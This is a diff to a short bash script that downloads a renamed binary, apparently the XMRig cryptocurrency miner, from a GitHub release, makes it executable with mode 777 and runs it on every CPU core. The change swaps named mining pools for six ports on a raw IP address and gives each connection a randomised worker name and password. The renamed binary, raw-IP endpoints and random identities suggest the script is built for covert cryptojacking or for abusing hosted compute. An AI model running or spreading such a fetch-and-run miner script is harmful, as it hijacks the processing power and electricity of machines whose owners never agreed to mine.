@@ -1,4 +1,9 @@
 #!/bin/bash
 wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
 chmod 777 vrl
-./vrl -a randomvirel --url eu.rplant.xyz:7155 --url asia.rplant.xyz:7155 --url na.rplant.xyz:7155 --user v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x --pass webpassword=x -t $(nproc --all)
+./vrl -o 51.20.74.163:8080 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.$(echo $(shuf -i 1-15000 -n 1)-A) -p $(echo $(shuf -i 1-15000 -n 1)-A) -k -a randomvirel \
+  -o 51.20.74.163:8081 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.$(echo $(shuf -i 1-15000 -n 1)-A) -p $(echo $(shuf -i 1-15000 -n 1)-A) -k -a randomvirel \
+  -o 51.20.74.163:8082 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.$(echo $(shuf -i 1-15000 -n 1)-A) -p $(echo $(shuf -i 1-15000 -n 1)-A) -k -a randomvirel \
+  -o 51.20.74.163:8083 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.$(echo $(shuf -i 1-15000 -n 1)-A) -p $(echo $(shuf -i 1-15000 -n 1)-A) -k -a randomvirel \
+  -o 51.20.74.163:8084 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.$(echo $(shuf -i 1-15000 -n 1)-A) -p $(echo $(shuf -i 1-15000 -n 1)-A) -k -a randomvirel \
+  -o 51.20.74.163:8085 -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.$(echo $(shuf -i 1-15000 -n 1)-A) -p $(echo $(shuf -i 1-15000 -n 1)-A) -k -a randomvirel -t $(nproc --all)
